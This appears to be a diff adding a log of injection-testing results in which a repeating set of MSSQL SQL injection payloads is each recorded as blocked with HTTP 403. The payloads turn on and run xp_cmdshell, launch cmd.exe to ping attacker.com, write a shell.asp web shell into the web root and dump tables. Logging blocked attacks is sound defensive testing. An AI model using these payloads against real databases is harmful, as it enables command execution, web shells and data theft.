+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004297448002034798}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004399149998789653}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006780704992706887}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004460012991330586}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004329481002059765}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005678722998709418}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037391509977169335}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003878035000525415}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004399541998282075}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0058178049948764965}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003517901001032442}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004071984003530815}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006453048001276329}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004397571989102289}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0039365340053336695}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004918196005746722}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006604145004530437}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038597189995925874}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004743919998873025}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006042665001587011}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037867630016990006}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004364213004009798}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004113949995371513}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005943520998698659}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004304021000280045}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004369031012174673}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005977498993161134}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004383694002171978}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003936073000659235}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004061832994921133}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004387955006677657}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004883838992100209}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041637609974714}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005775079000159167}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004634800003259443}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00423268300073687}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004044430999783799}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005151274992385879}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00524390499049332}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004054353994433768}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007089649996487424}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004775991998030804}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004502105002757162}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006848849996458739}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043593279988272116}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004306856993935071}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006306713999947533}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004001649998826906}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004090800997801125}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004928485999698751}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005627803999232128}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004479000010178424}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004291147008189}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00619545100198593}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004456485010450706}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004344418994151056}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006007225994835608}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057349819981027395}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004228581005008891}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005281081001157872}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00529207699582912}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005317476010532118}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004233405998093076}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00521648301219102}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038758059963583946}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00402389100054279}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004013199999462813}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057505320000927895}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004737938987091184}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043406420008977875}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005099886009702459}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004361220999271609}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005304392005200498}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008023877002415247}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051755320018855855}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038765979988966137}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0053582290129270405}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003964062008890323}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036641460028477013}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032337390002794564}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004744892008602619}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004026807000627741}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034904719941550866}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003321356009109877}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004538534005405381}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004361874991445802}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0039934429951244965}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004033689998323098}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0062042770005064085}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005658794994815253}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004615505997207947}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006820805007009767}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047486560069955885}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004090869988431223}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0060206839989405125}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005327505001332611}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048590319929644465}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005702359005226754}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004880245993263088}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038341019971994683}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003636202003690414}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007871491994592361}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004650080998544581}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036457360110944137}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006231406005099416}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004677982011344284}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038485939876409248}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006330909993266687}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006423498998628929}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0053429460094776005}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005733958998462185}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004223284995532595}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047018100012792274}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008184487000107765}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005725823997636326}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005165173002751544}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006259622008656152}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004782774005434476}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038150199980009347}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006348655006149784}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004903877998003736}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005444031005026773}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007001884994679131}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006166293998830952}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046944349887780845}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00703447699197568}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004985847001080401}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004239468005835079}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007323094003368169}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00446178499259986}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036536380066536367}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006492531989351846}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004382834988064133}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003645029995823279}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004353445998276584}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004810458995052613}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037105420051375404}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036848029994871467}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004074438009411097}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005306323990225792}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037171809963183478}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032652269874233752}
